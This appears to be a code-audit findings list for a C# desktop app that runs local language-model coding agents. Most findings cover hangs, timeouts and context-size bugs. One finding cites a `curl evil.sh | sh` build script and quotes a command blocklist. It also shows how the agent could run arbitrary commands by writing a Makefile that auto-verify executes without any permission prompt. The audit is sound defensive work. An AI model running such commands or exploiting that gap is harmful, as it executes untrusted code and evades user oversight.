findings.evidence: CodeAgentService.cs:1605 `for (int iteration = 0; iteration < iterationBudget; iteration++)` with line 2023 `iterationBudget = iteration + 1 + EscalationBonusIterations;` (+8), but the status line 1615 interpolates the unchanged property: `$"Step {iteration + 1}/{MaxAgentIterations} ยท {nativeThinkVerb}..."`.
findings.scenario: Local model escalates near exhaustion at step 25/25; the bonus iterations then display as 'Step 26/25', 'Step 27/25' โ€ฆ 'Step 33/25' in the status bar โ€” looks like a runaway loop to the user (who already distrusts the app for hanging).
findings.fix: Interpolate `iterationBudget` instead of `MaxAgentIterations` in the native loop's status strings.

findings.title: Native path has no corrective retry when salvage finds nothing โ€” a weak model's malformed tool-call JSON is published verbatim as the final answer (legacy path has the nudge, native doesn't)
findings.evidence: CodeAgentService.cs:1780+: after salvage misses, `if (response.ToolCalls.Count == 0) { ... result.FinalResponse = textContent; result.Success = true; break; }` โ€” no equivalent of the legacy loop's unknown-tool feedback (lines 1239-1259, `unknownToolFeedbackCount < MaxUnknownToolFeedbacks ... "These tool names are not registered... Re-issue your action"`). ToolCallSalvage.ExtractFromText returns empty for truncated/single-quoted/invalid JSON (ToolCallSalvage.cs:41 `catch { /* candidate isn't valid JSON */ }`).
findings.scenario: A weak local model emits `{'name': 'read_file', 'path': ...` (single quotes / truncated). JSON.Parse fails for every candidate, salvage returns empty, and the loop ends the turn with the broken JSON fragment shown to the user as the assistant's answer โ€” one bounded 'your tool call was malformed, re-issue it' nudge (mirroring the legacy path) would have recovered it.
findings.fix: When ToolCalls.Count==0, salvage failed, and the text matches a tool-call-looking pattern (starts with '{' or contains '"name"/'tool''), inject one bounded corrective user message ('Your tool call was malformed JSON โ€” re-issue it as valid JSON using one of the provided tools') and continue, capped like MaxUnknownToolFeedbacks.

findings.title: SSE read loop sync-blocks the WPF UI thread for the entire prefill โ€” the literal 'app hangs' bug
findings.evidence: LlamaServerProvider.cs:393 `while (!reader.EndOfStream)` / `var line = await reader.ReadLineAsync(ct);` โ€” identical pattern at OllamaProvider.cs:220. Consumers run on the UI thread: ChatViewModel.cs:2156 `await foreach (var token in _agentService.ChatStreamAsync(history, input, ct))` and ChatViewModel.cs:1743 `var result = await _agentService.ExecuteAgenticAsync(history, input, progress, ct);` โ€” both awaited directly from SendMessage (UI dispatcher context, no Task.Run, no ConfigureAwait(false)), so every segment of the async iterator resumes on the WPF SynchronizationContext.
findings.scenario: User sends a message to a local model. llama-server/Ollama returns HTTP headers immediately, then sends NOTHING until prompt-eval finishes (tens of seconds to minutes for a 3-4k-token prompt on a mid-range GPU, far longer on CPU). `StreamReader.EndOfStream` performs a SYNCHRONOUS blocking Read when its buffer is empty โ€” executed on the UI thread, it freezes the entire window for the whole prefill and again at every inter-chunk gap during slow generation. The blocking read ignores `ct`, so the Stop button is dead too. This exactly matches the complaint 'เธกเธฑเธเธเนเธฒเธ' (it hangs).
findings.fix: Never call EndOfStream on a network stream. Replace the loop condition in BOTH providers with `string? line; while ((line = await reader.ReadLineAsync(ct)) != null) { ... }` (ReadLineAsync returns null at EOF). Additionally consider wrapping the whole send path in Task.Run or adding ConfigureAwait(false) throughout the provider iterators so token parsing never runs on the UI thread.

findings.title: LocalGgufProvider never forwards native tool use โ€” the entire 11-lever weak-model harness is dead on the default local path
findings.evidence: LocalGgufProvider.cs:14 `public class LocalGgufProvider : IAiProvider` contains NO override of SupportsNativeToolUse or ChatWithToolsAsync, so the interface defaults apply: IAiProvider.cs:39 `bool SupportsNativeToolUse => false;` and IAiProvider.cs:54 returns "Native tool use not supported by this provider." The dispatch gate is CodeAgentService.cs:1035 `if (_providerManager.ActiveProvider.SupportsNativeToolUse)`. Worse, startup auto-load FORCES this provider: ChatViewModel.cs:645-646 `if (_providerManager.ActiveProviderType != AiProviderType.Local) await _providerManager.SwitchProviderAsync(AiProviderType.Local);`.
findings.scenario: User loads a GGUF via 'Local GGUF' (the default; auto-load even switches a LlamaServer user back to Local on every app start). The router puts the model on llama-server (GPU path, commit c95a986), but ActiveProvider is LocalGgufProvider whose SupportsNativeToolUse is false โ’ ExecuteAgenticAsync always takes ExecuteLegacyToolLoopAsync ([ACTION:] text parsing). Plan-first forced toolChoice, ToolCallSalvage, escalation ladder, A2 sampling params, A5 ctx-aware schema subset, and constrained tool_choice decoding all live in ExecuteNativeToolLoopAsync and never execute. The just-landed reliability harness (ee066da) is unreachable for the #1-priority user population.
findings.fix: In LocalGgufProvider add: `public bool SupportsNativeToolUse => _activeBackend == Backend.LlamaServer && _serverProvider.SupportsNativeToolUse;` and `public Task<NativeToolResponse> ChatWithToolsAsync(...) => _activeBackend == Backend.LlamaServer ? _serverProvider.ChatWithToolsAsync(...) : <interface default>;`. (LLamaSharp backend stays on the legacy loop.)

findings.title: Ollama actual context window never configured โ€” all ctx math (clamp, A5 subset, prompt gating) compares against a fictional value
findings.evidence: OllamaProvider.cs:167-174 `options = new { temperature..., top_p..., num_predict = numPredict, repeat_penalty..., repeat_last_n... }` โ€” no num_ctx is ever sent (same in ChatWithToolsAsync options dict, lines 310-317). Yet OllamaProvider.cs:160/330 clamp with `ClampMaxTokens((int)settings.ContextSize, ...)`, and CodeAgentService.cs:657-661 (`includeToolDefs = ... contextTokens >= 8000`) plus 1566-1568 (`localSmallCtx = ... (int)_settingsService.Settings.ContextSize < 8000`) gate the tool catalogue and schema subset on the SAME unrelated setting. settings.ContextSize only configures the llama-server `-c` flag โ€” Ollama runs at its own default num_ctx.
findings.scenario: User sets ContextSize=16384 for their llama-server model, then switches to Ollama (daemon default num_ctx 2048/4096). CluadeX decides the window is 'big': injects the full ~46-tool catalogue + heavy project context and clamps num_predict against 16384. Ollama silently truncates the oldest part of the prompt โ€” the system prompt and tool definitions are the first to go โ€” so the model ignores instructions, hallucinates tools, or replies with garbage: the documented overflow failure mode, reintroduced through the side door.
findings.fix: Send `options["num_ctx"] = (int)settings.ContextSize` in BOTH OllamaProvider.ChatAsync and ChatWithToolsAsync so the daemon's real window matches the value all the budgeting/gating math assumes (or query /api/show for the model's context and use that).

findings.title: Idle timeout never resets on the local native tool path (non-streaming, onTextDelta never fires) โ€” slow-but-healthy turns are killed at 120s
findings.evidence: CodeAgentService.cs:1658+1668: `if (timeoutSec > 0) callCts.CancelAfter(...)` is reset ONLY inside `onTextDelta: token => { ... CancelAfter ... }`. But LlamaServerProvider.ChatWithToolsAsync sends `["stream"] = false` (LlamaServerProvider.cs:490) and never invokes onTextDelta (parameter unused in the method body, lines 471-523); OllamaProvider.ChatWithToolsAsync likewise (`["stream"] = false`, OllamaProvider.cs:322). The comment at 1650-1652 ('a healthy (even slow) generation is never cut off') is false for every local tool turn.
findings.scenario: Agentic turn on a local model with a grown context: prefill of a 10k-token conversation plus generation of a long Edit tool call takes >120s (InteractiveRequestTimeoutSeconds default 120, AppSettings.cs:64) on a mid-range GPU, trivially on CPU fallback. callCts fires โ’ TimeoutException 'the model did not respond' โ’ ChatViewModel's retry loop re-sends the SAME oversized request 3 times โ’ ~8 minutes of spinner then an error, even though llama-server was generating fine the whole time. User experiences this as 'agent mode always times out / hangs'.
findings.fix: Make the local tool path stream: send stream:true and accumulate OpenAI tool_call deltas from SSE, invoking onTextDelta per chunk (this both feeds the idle reset and gives live UI). Short-term mitigation: skip CancelAfter (or use a much larger absolute cap) when the active provider is a non-streaming local one.

findings.title: TokenBudget clamps against live settings.ContextSize, not the ctx the server was actually launched with
findings.evidence: Launch: LlamaServerProvider.cs:136 `"-c", settings.ContextSize.ToString()` (read once at load). Requests: line 364 `int maxTokens = ...ClampMaxTokens((int)settings.ContextSize, approxPromptTokens, settings.MaxTokens);` and line 504 (tool path) re-read the CURRENT setting on every call. Nothing snapshots the loaded ctx. Related: TokenBudget.cs:37 `int roomForGen = Math.Max(floor, ctxSize - approxPromptTokens - margin);` โ€” when the prompt alone already exceeds ctx, the floor (256) still lets the request go out.
findings.scenario: User loads a model (server starts with -c 4096), then raises ContextSize to 16384 in Settings without reloading (nothing forces a reload). Every subsequent clamp believes there are 16k tokens of room: prompts beyond 4096 are sent, llama-server rejects with 'request exceeds the available context size' (or context-shifts/truncates on older builds โ’ degraded answers). Inverse direction over-clamps output. Also independent of settings changes: once conversation history alone exceeds ctx, the floor=256 path still fires the doomed request instead of compacting first.
findings.fix: Capture `_loadedContextSize = (int)settings.ContextSize` in LoadModelAsync and clamp every request against the snapshot; expose it so CodeAgentService's prompt/schema gating uses the same number. When `approxPromptTokens + floor > _loadedContextSize`, trigger proactive compaction (or a clear 'context full' error) instead of sending.

findings.title: No Exited handler, no Job Object: crashed server shows stale 'Ready', killed app orphans a VRAM-holding zombie
findings.evidence: LlamaServerProvider.cs:173 `_serverProcess = new Process { StartInfo = psi, EnableRaisingEvents = true };` โ€” EnableRaisingEvents is set but NOTHING subscribes to Exited (grep confirms no `Exited +=` in the file; the only one in the repo is McpStdioTransport.cs:69). Cleanup exists only in Dispose/StopServerAsync (`Kill(entireProcessTree: true)`), which never run if the app crashes or is killed. FindFreePort (lines 595-609) silently hops AWAY from a stale server's port instead of detecting/reaping it.
findings.scenario: (a) Mid-session CUDA OOM kills llama-server: status bar keeps 'Ready: model [GPU]'; the next agentic turn returns 'llama-server is not running. Load a model first.' rendered as a normal assistant reply (line 475-476) with no auto-restart โ€” user thinks the AI is broken. (b) CluadeX crashes or is killed from Task Manager: llama-server.exe survives holding 6-20 GB VRAM. On next launch, FindFreePort hops to 8088 and starts a SECOND server โ’ model load fails OOM or silently offloads fewer layers (slow), and nothing ever reaps the zombie.
findings.fix: Subscribe `_serverProcess.Exited += ...` โ’ set IsReady=false, SetStatus/RaiseError('llama-server exited unexpectedly (code N)'), optionally auto-restart once. For orphans: assign the child to a Windows Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE at spawn, or at startup kill any running llama-server.exe whose MainModule path is inside our llama-backend folder before loading.

findings.title: chars/4 token estimate under-counts Thai 2-4x on the in-proc path โ€” the prompt-starvation clamp fails exactly for Thai users
findings.evidence: TokenBudget.cs:19-20 `public static int EstimateTokens(string? text) => string.IsNullOrEmpty(text) ? 0 : text.Length / 4;` and the same inline math at LlamaInferenceService.cs:440-441 `int approxPromptTokens = prompt.Length / 4; int roomForGen = Math.Max(256, ctxSize - approxPromptTokens - 64);`. The doc comment claims the estimate is 'intentionally biased high' โ€” false for Thai/CJK, where GGUF tokenizers produce ~1 token per 1-2 chars (often per character).
findings.scenario: Thai-speaking user (the actual user) chats in Thai on the in-process LLamaSharp path with ctx=4096/MaxTokens=4096 defaults. A 6,000-char Thai conversation is estimated at 1,500 tokens but actually tokenizes to ~4,000+ โ’ the clamp leaves MaxTokens huge, prompt + generation overruns the window โ’ the model stalls or emits nothing: the original documented 'local chat hangs / never answers' bug, resurrected for non-Latin input. (The HTTP paths escape this only by accident: JsonSerializer escapes Thai to \uXXXX before measuring, inflating the char count.)
findings.fix: Weight non-ASCII: `int est = 0; foreach(char c in text) est += c < 128 ? 1 : 4; return est / 4;` (ASCII ~4 chars/token, non-ASCII ~1 token/char) in both TokenBudget.EstimateTokens and the LlamaInferenceService inline copy โ€” keep the bias in the safe (high) direction.

findings.title: Tool-incapable llama-server/Ollama returns HTTP error that is rendered as the assistant's final answer โ€” no fallback to the legacy loop
findings.evidence: LlamaServerProvider.cs:511-519: `if (!response.IsSuccessStatusCode) { ... return new NativeToolResponse { TextContent = $"llama-server tool call failed ({(int)response.StatusCode}): {...}", StopReason = "end_turn" }; }` โ€” same pattern at OllamaProvider.cs:349-357. In ExecuteNativeToolLoopAsync, ToolCalls.Count == 0 + end_turn means 'final response' (CodeAgentService.cs:1780-1808), so the raw HTTP error becomes the chat answer and the loop exits. BuildOpenAiToolChoice itself is correct OpenAI shape (string for auto/none/required, {type:function,function:{name}} for named โ€” ApiProviderBase.cs:186-202), and only null/'required' are currently passed (CodeAgentService.cs:1660-1661).
findings.scenario: User runs an older llama-server build (no tools support โ’ 500 'Unsupported param: tools'), a GGUF whose chat template lacks tool syntax, or an Ollama model without tool capability (400 'model does not support tools'). With LocalNativeToolUseEnabled=true (default), EVERY agentic message instantly 'completes' with 'llama-server tool call failed (500): ...' as the assistant reply. The agent never does anything; the [ACTION:] legacy loop that WOULD work is never tried; no guidance to update llama-backend or disable the toggle.
findings.fix: Detect tool-unsupported responses (4xx/5xx with 'tool' in the body) in the native loop and degrade gracefully: re-run the turn via ExecuteLegacyToolLoopAsync (or retry once without the tools array), surface a one-time status 'model/server lacks native tool support โ€” using text-mode tools', and optionally persist a per-model flag so subsequent turns skip the failing call.

findings.title: WaitForServerReady hard 120s cap mislabels slow-loading large models as 'incompatible' and kills the load
findings.evidence: LlamaServerProvider.cs:298 `private async Task<bool> WaitForServerReady(CancellationToken ct, int maxWaitMs = 120_000)` and lines 224-227: `await StopServerAsync(); throw new InvalidOperationException("llama-server failed to start. Check if the model is compatible.");`
findings.scenario: User loads a 30+ GB Q4 70B (or any big model from an HDD / PCIe-constrained eGPU). Weight upload takes >2 minutes; the health endpoint is still 503 at the 120s mark, so the provider KILLS the half-loaded server and reports 'Check if the model is compatible' โ€” a misleading error for a perfectly compatible model. The stderr progress parser (ReportLoadProgress) was demonstrably still reporting layer-offload progress when the process was killed.
findings.fix: Scale maxWaitMs by model file size (e.g. 60s + 10s/GB), or keep waiting as long as ReportLoadProgress saw a progress line within the last ~30s (the stderr reader already mines these). Differentiate the failure message: process exited โ’ real incompatibility; still loading at deadline โ’ 'model is still loading, increase timeout'.

findings.title: Agentic prose answers generated at ToolCallTemperature 0.2 โ€” robotic final replies in agent mode (plain chat path is clean)
findings.evidence: LlamaServerProvider.cs:485 `["temperature"] = (double)Math.Min(settings.Temperature, settings.ToolCallTemperature),` plus top_k/min_p/repeat_penalty (486-489) apply to EVERY native-loop turn โ€” including the final no-tool prose answer โ€” because the provider can't know which turns are tool turns. Plain chat is unaffected: ChatAsync line 372 sends `temperature = (double)settings.Temperature` with no A2 params. ToolCallTemperature default 0.2 (AppSettings.cs:40).
findings.scenario: User in agentic mode asks a question that ends with a written explanation. The final explanation turn is sampled at temp 0.2 + repeat_penalty, producing terse, repetitive, robotic text compared with the same model in plain-chat mode. Acceptable trade-off for tool-JSON determinism, but it silently changes the model's voice for every agent-mode reply.
findings.fix: Pass the toolChoice hint through: when CodeAgentService expects a prose turn (e.g. final summarize step or toolChoice=="none"), send chat-temperature instead of the clamped tool sampling; alternatively expose the clamp as a documented setting note so users understand why agent-mode replies differ.

findings.title: run_command waits for exit BEFORE reading pipes โ€” pipe-buffer deadlock hangs every verbose command (run_build/run_tests/auto-verify all funnel here)
findings.scenario: Any run_command whose child writes more than the ~4KB pipe buffer (dotnet build, npm install, git log, dir /s) blocks on a full stdout pipe; the parent sits in WaitForExitAsync until the timeout CTS fires, kills the process, and returns "Command timed out (30s limit)". Worse: ExecuteRunBuildAsync passes timeout_ms=180000 and ExecuteRunTestsAsync 300000, and AutoVerifyAfterEditEnabled defaults TRUE โ€” so after EVERY successful file edit the agent silently runs the detected build, deadlocks for up to 3 minutes, then reports a bogus timeout. The UI shows 'Auto-verifying build after edit...' frozen for minutes per edit. This is almost certainly the user's "เธกเธฑเธเธเนเธฒเธ" (app hangs) complaint. The 2026 audit note 'Process deadlocks (git, powershell, hooks) โ’ fixed with concurrent reads' never covered run_command โ€” it regressed or was never fixed.
findings.fix: Reorder to the proven pattern used everywhere else in the codebase: var stdoutTask = process.StandardOutput.ReadToEndAsync(cts.Token); var stderrTask = process.StandardError.ReadToEndAsync(cts.Token); await process.WaitForExitAsync(cts.Token); stdout = await stdoutTask; stderr = await stderrTask; (kill + drain in the OperationCanceledException handler). Optionally cap the read with a bounded reader instead of ReadToEndAsync to avoid buffering multi-GB output before the 5000-char truncation at line 1645.

findings.title: Auto-verify (default ON) executes project-defined build scripts with NO permission prompt and NO PreToolUse hooks โ€” blocklist is not a sufficient guard
findings.evidence: RunVerifyBuildAsync (AgentToolService.cs:1499-1505): "System-initiated, so it deliberately bypasses the model permission gate + PreToolUse hooks ... the dangerous-command blocklist inside the runner still applies" โ€” it calls ExecuteRunBuildAsync(call, ct) directly, never ExecuteToolAsync. DetectBuildCommand (FileSystemService.cs:241,244) returns "npm run build" when package.json exists and "make" for Makefile. CheckDangerousCommand (AgentToolService.cs:3553-3584) only matches literal command text prefixes/substrings ("rm -rf /", "| rm ", "invoke-webrequest"...) โ€” the string "npm run build" passes trivially regardless of what the build script actually does. Invocation: CodeAgentService.cs:1958-1969, gated only by AutoVerifyAfterEditEnabled which defaults true (AppSettings.cs:133).
findings.scenario: (a) User opens an untrusted/cloned repo whose package.json build script is `curl evil.sh | sh`; the agent edits README.md per the user's request; auto-verify fires `npm run build` with zero prompts โ’ arbitrary code execution. (b) Permission-gate escape: the model write_file's a Makefile/package.json (user approves what looks like a harmless config diff), then any subsequent edit triggers auto-verify which executes the script โ€” the model has run an arbitrary command without ever producing an 'execute' permission prompt. The codebase's own comment at 3550 admits the blocklist is "defense-in-depth, NOT a security boundary โ€” the permission prompt is", yet this path removes the permission prompt.
findings.fix: Either (1) route the RESOLVED command through _permissionService.CheckPermission(cmd, "execute", "run_build") and prompt once per session per command (cache the user's approval), or (2) restrict zero-prompt auto-verify to a safelist of direct compiler invocations (dotnet build, cargo build, go build, npx tsc --noEmit) and require approval for script-runner commands (npm run *, make, gradle) since those execute repo-controlled code. Also re-check the resolved command whenever a build-definition file (package.json/Makefile/*.csproj) was modified in the same turn.

findings.title: notebook_edit and hex tools modify files but map to 'execute' scope with non-path resource โ€” write-scoped permission rules and read-before-edit never apply
findings.evidence: Scope switch (AgentToolService.cs:277-283): `ToolType.WriteFile or ToolType.EditFile or ToolType.MultiEdit or ToolType.CreateDirectory => "write", ... _ => "execute"` โ€” NotebookEdit falls into `_`. Resource resolution (line 276): `call.GetArg("path", call.GetArg("command", call.ToolName))` โ€” ExecuteNotebookEdit reads `notebook_path` (line 3429: `call.GetArg("notebook_path", call.GetArg("path"))`), so when the model passes notebook_path the permission resource degrades to the literal string "notebook_edit". CheckReadBeforeEdit is only called from ExecuteWriteFile/ExecuteEditFile/ExecuteMultiEdit (lines 1243/1275/1337) โ€” ExecuteNotebookEdit (3427) writes the .ipynb with no read-before-edit or stale-mtime check. The hex section comment (3673) claims "hex_patch and hex_open are gated by the standard permission system (write scope)" but they also fall to `_ => "execute"`.
findings.scenario: User adds rule `deny write **/*.ipynb` (or `deny write /src/**`) expecting all file mutations blocked โ€” notebook_edit sails past because its scope is 'execute' and its resource is the tool name, not a path; the rule never matches. Default-Ask still prompts, but a user who allow-listed 'execute: notebook_edit' once has permanently un-gated writes to ANY notebook path. Separately, notebook_edit can overwrite a notebook the model never read, the exact stale-write bug EnforceReadBeforeEdit was built to stop for write_file/edit_file.
findings.fix: In the scope switch add `ToolType.NotebookEdit or ToolType.HexPatch => "write"`, and for resource resolution use `call.GetArg("notebook_path", call.GetArg("path", ...))`. In ExecuteNotebookEdit, call CheckReadBeforeEdit(call, notebookPath) before writing and _fileSystem.MarkKnown(notebookPath) after, mirroring ExecuteWriteFile.

findings.title: Write-validation warning path rebuilds ToolResult and drops Diff/FilePath/Error โ€” UI loses the inline diff exactly when a warning fires
findings.evidence: toolResult = new ToolResult { ToolName = toolResult.ToolName, Type = toolResult.Type, Success = true, Output = toolResult.Output + $"\nโ  Validation: {writeValidation}", Summary = toolResult.Summary + " (with warnings)" }; โ€” the replacement object omits Diff, FilePath, Arguments (ExecuteWriteFile/EditFile set Diff and FilePath at AgentToolService.cs:1258-1259/1321-1322).

The rebuilt ToolResult reaches OnToolExecuted with Diff=null, so the chat renders the tool action WITHOUT the colorized inline diff (and without FilePath for click-through) โ€” precisely on the edits that most deserve user scrutiny.

findings.title: AppSettings round-trip silently drops unknown JSON fields (no JsonExtensionData) โ€” forward/backward-compat data loss on every Save
findings.evidence: _settings = JsonSerializer.Deserialize<AppSettings>(json, JsonOptions) ?? new AppSettings(); ... Save(): string json = JsonSerializer.Serialize(clone, JsonOptions); โ€” grep for JsonExtensionData in AppSettings.cs returns no matches, so any property not declared on the running binary's AppSettings is discarded at Load and absent from the next Save.
findings.scenario: User runs a newer build that wrote the 11 new lever fields, then reverts to the previous build (or a portable copy): the old binary loads settings.json, drops every unrecognized field, and the first Save() permanently erases the newer toggles' values (EscalationEnabled, MicrocompactKeepRecentTurns, ...). Same for any hand-added keys. Note the rest of item 7 verified clean: all 11 toggle defaults are sane (EscalationEnabled=false, AutonomousLoopEnabled=false, SessionMemoryEnabled=false opt-in, AutoVerify/Microcompact/RBE=true at AppSettings.cs:67-179) and Load() runs in the SettingsService constructor before any consumer reads a toggle, so no first-turn wrong-default exists.
findings.fix: Add `[JsonExtensionData] public Dictionary<string, JsonElement>? ExtraFields { get; set; }` to AppSettings (and nested ProviderConfig/FeatureToggles) so unknown fields survive the loadโ’save round-trip.

findings.title: Restored sessions lose inline diffs and tool arguments โ€” DiffLines/DiffStat/ToolArguments are never persisted
findings.evidence: INSERT INTO messages (id, session_id, role, content, timestamp, tool_name, tool_summary, tool_output, tool_success, has_error, sort_order) โ€” ChatMessage.DiffLines/DiffStat (ChatMessage.cs:117-119), ToolArguments (108) and ToolElapsedTime have no columns and are not round-tripped; LoadSession (DatabaseService.cs:267-278) rebuilds messages without them.

findings.evidence: Concurrent reads (293-298): "// Read stdout/stderr concurrently to avoid pipe deadlock" โ€” var stdoutTask = proc.StandardOutput.ReadToEndAsync(cts.Token); var stderrTask = ...; await proc.WaitForExitAsync(cts.Token); with per-hook timeout (cts.CancelAfter(hook.TimeoutMs), default 10s) and Kill(true) on cancel (309). findings.title: SSE stream loops block on StreamReader.EndOfStream โ€” synchronous, uncancellable network read on the UI thread (all 5 streaming providers)
findings.scenario: User chats with a local model via llama-server. During prompt processing (10s-minutes on long context / partial GPU offload) the server sends no SSE bytes, so EndOfStream's sync Read blocks THE UI THREAD โ€” window shows '(Not Responding)', the Stop button can't even be clicked. If llama-server wedges (CUDA stuck, process suspended) while keeping the socket open, the block is permanent: the idle-timeout CTS (CodeAgentService.cs:2380/1658) fires its timer but cancellation can only be observed at the next await, which never comes โ€” nothing aborts the connection. Even on the happy path the UI stutters/freezes between every network chunk during streaming. This is the literal 'เธกเธฑเธเธเนเธฒเธ' report.
findings.fix: Two-part fix: (1) Replace every `while (!reader.EndOfStream) { var line = await reader.ReadLineAsync(ct); ... }` with `string? line; while ((line = await reader.ReadLineAsync(ct)) != null) { ... }` โ€” ReadLineAsync(ct) returns null at EOF and is cancellable. Also register connection abort so the idle timeout actually bites: `using var abortReg = ct.Register(() => response.Dispose());` before the read loop. (2) Stop running provider iterators on the dispatcher: in ChatViewModel wrap the consumption in Task.Run (the code already marshals all UI updates via App.Current?.Dispatcher.Invoke, so it is background-safe by design).

findings.title: ExecuteRunCommandAsync awaits WaitForExitAsync BEFORE reading stdout/stderr โ€” classic pipe-buffer deadlock; run_build/run_tests/auto-verify freeze for the full timeout then falsely report 'timed out'
findings.scenario: Agent edits a file โ’ auto-verify runs `dotnet build`. dotnet build output easily exceeds 4KB, so the child stalls writing, WaitForExitAsync never completes, and the chat sits on 'Auto-verifying build after edit...' for a full 180 seconds, then the build is killed and reported as FAILED ('timed out'). The failure note is fed back to the model, which 'fixes' nothing and builds again โ’ another 3-minute freeze, repeating up to MaxAutoVerifies=6 (~18 minutes of apparent hang per task). Any run_command with verbose output (npm install, git log, dir /s) hits the same 30s stall + false timeout.

findings.title: Entire agentic loop โ€” including synchronous tool implementations (repo-wide content search, file reads, diff preview) โ€” executes on the WPF UI thread
findings.evidence: ChatViewModel.cs:1743: `var result = await _agentService.ExecuteAgenticAsync(history, input, progress, ct);` โ€” invoked from SendMessage on the dispatcher (AsyncRelayCommand.Execute, ViewModelBase.cs:85) with no Task.Run, and grep shows ConfigureAwait(false) appears exactly once in the whole app (SubAgentService.cs). So every continuation of the loop runs on the UI thread, where ExecuteToolAsync dispatches SYNCHRONOUS tool bodies directly: AgentToolService.cs:310 `ToolType.ReadFile => ExecuteReadFile(call),` :318 `ToolType.SearchContent => ExecuteSearchContent(call),` (line 1563 `var results = _fileSystem.SearchContent(query, path, filePattern);` โ€” a full repo scan), :373 GlobSearch, :374 Grep, plus TryComputePreviewDiff in the permission gate. 'Run read-only tools in parallel' (CodeAgentService.cs:1947 Task.WhenAll) is also serialized onto the same single thread.
findings.scenario: Agent calls search_content/grep over a large project, or read_file on a big file: the WPF window freezes for the entire scan (seconds to tens of seconds, '(Not Responding)'), Stop is unclickable, the elapsed-timer status stops updating. Combined with finding #1 the user experiences the whole agentic turn as one long UI freeze. Also makes the parallel read-tool execution a no-op.
findings.fix: In ChatViewModel, run the loop off the dispatcher: `var result = await Task.Run(() => _agentService.ExecuteAgenticAsync(history, input, progress, ct));` (same for RunStreaming/RunWithAutoExecution/RunAutonomous). This is safe because every UI touch inside the loop and its event handlers already marshals through App.Current?.Dispatcher.Invoke/BeginInvoke (OnStreamToken ChatViewModel.cs:1667, OnToolStarting:1860, OnToolExecuted:1906, permission prompt:473). Alternatively/additionally wrap heavy sync tools (SearchContent, glob, grep, read) in Task.Run inside ExecuteToolAsync.

findings.title: In-process LLamaSharp inference (CPU path) runs native prefill/decode on the consuming UI thread โ€” window frozen for the whole generation
findings.evidence: LlamaInferenceService.cs:478: `await foreach (var text in executor.InferAsync(prompt.ToString(), inferenceParams, ct))` inside `public async IAsyncEnumerable<string> ChatAsync(...)` (line 358). LLamaSharp's InteractiveExecutor.InferAsync performs llama_decode synchronously inside MoveNextAsync on the caller's thread; this iterator is consumed via CodeAgentService.ChatStreamAsync โ’ ChatViewModel.RunStreaming (ChatViewModel.cs:2156) on the UI thread with no Task.Run/Channel offload anywhere in the chain (only Task.Run in this file is for model LOADING, line 211).
findings.scenario: User on the in-proc CPU path (no llama-server.exe found) sends a message with a long history: the entire prompt prefill (often 10-60s on CPU) executes synchronously on the dispatcher before the first token โ€” total UI freeze, '(Not Responding)', Stop unreachable. Each subsequent token decode also blocks the UI between yields, so the app stays frozen for the whole reply.
findings.fix: Pump the inference on a background thread into a Channel<string> (Task.Run producer writing channel; ChatAsync yields from channel.Reader.ReadAllAsync(ct)), or fix at the consumer as in finding #3 (Task.Run around the whole send pipeline), which resolves this path too.

findings.title: Local native tool loop: 120s idle timeout never resets because LlamaServerProvider.ChatWithToolsAsync is non-streaming and never calls onTextDelta โ€” long local generations always time out, then auto-retry repeats the stall
findings.evidence: LlamaServerProvider.cs:490: `["stream"] = false,` โ€” and the `onTextDelta` parameter (line 473) is never invoked anywhere in the method body. The loop's idle window only resets inside that callback: CodeAgentService.cs:1666-1668 `onTextDelta: token => { if (timeoutSec > 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec)); ... }` with `InteractiveRequestTimeoutSeconds` defaulting to 120 (AppSettings.cs:64). So for the local native path the 'idle' timeout is actually a hard cap on the ENTIRE generation. On timeout, CodeAgentService.cs:1678 throws TimeoutException, which ChatViewModel.cs:1532-1534 classifies as retryable and re-sends up to 3 times (each retry re-processes the full prompt).
findings.scenario: User loads a 14B-27B GGUF (the catalog now ships Gemma 27B / multi-GPU tensor-split rigs) and gives an agentic task with a 16k context. Prompt processing + a long tool-planning response takes >120s โ’ request is cancelled at exactly 120s, 'Request timed out' โ’ auto-retry 1..3 each hitting the same wall โ’ ~8 minutes of 'Working...' ending in an error, while llama-server was healthily generating the whole time. Looks exactly like 'เธเนเธฒเธ + เธเธฑเธ' on the priority-#1 local path.
findings.fix: Use stream=true for the local tool path and accumulate OpenAI tool_call deltas from the SSE stream, invoking onTextDelta per chunk so the idle window resets (llama-server supports streamed tool calls with --jinja). Cheaper interim fix: in ExecuteNativeToolLoopAsync, skip/raise the CancelAfter cap when the active provider is a non-streaming local provider, or poll llama-server's /slots busy state as the liveness signal.

findings.title: Plain-chat streaming path has no idle/stall timeout at all (agentic paths have one, chat mode doesn't)
findings.evidence:
CodeAgentService.cs:1003-1015 ChatStreamAsync:
    await foreach (var token in _providerManager.ActiveProvider.ChatAsync(history, userMessage, systemPrompt, ct))
        yield return token;
No linked CTS / CancelAfter here, and none in the consumer RunStreaming (ChatViewModel.cs:2156). Contrast with the agentic paths which both wrap calls in an idle-reset CTS (CodeAgentService.cs:2378-2380 and 1654-1658).

The UI shows 'Generating...' forever; the only escape is the Stop button โ€” which, per finding #1, cannot interrupt the sync EndOfStream read anyway. IsGenerating stays true, so the user can't send anything: app effectively hung until restart.

Depends on finding #1's fix for the cancellation to actually interrupt the read.

findings.title: ask_user tool is advertised to the model but has no UI handler โ€” OnAskUserQuestion has zero subscribers, so every call fails
findings.evidence: AgentToolService.cs:3334: `public event Func<string, List<string>, Task<string>>? OnAskUserQuestion;` โ€” project-wide grep finds only the declaration, the null-check (3347 `if (OnAskUserQuestion == null) return Fail(call, "AskUser not available โ€” no UI handler connected");`) and the invoke (3352). ChatViewModel wires OnPermissionRequired (ChatViewModel.cs:438) but never OnAskUserQuestion. The tool is still dispatched (line 375) and exposed via schemas/name resolution (2442).

The call instantly errors 'AskUser not available โ€” no UI handler connected'; the model either retries (burning turns toward the iteration budget) or guesses, producing wrong work the user perceives as 'เธเธฑเธ'.

findings.title: Pending permission prompt is destroyed by LoadSession/NewSession โ€” agent loop awaits forever, IsGenerating stuck
findings.evidence: LoadSession: "Messages.Clear();" (line 823) and NewSession: "Messages.Clear();" (line 1157) โ€” neither cancels _cts nor checks IsGenerating. The permission TCS (line 446: "var tcs = new TaskCompletionSource<bool>(...)") only resolves via prompt.PermissionCallback (the Allow/Deny buttons on the ChatMessage that was just removed from Messages) or via token.Register on _cts (line 462), which only fires on the Stop button.
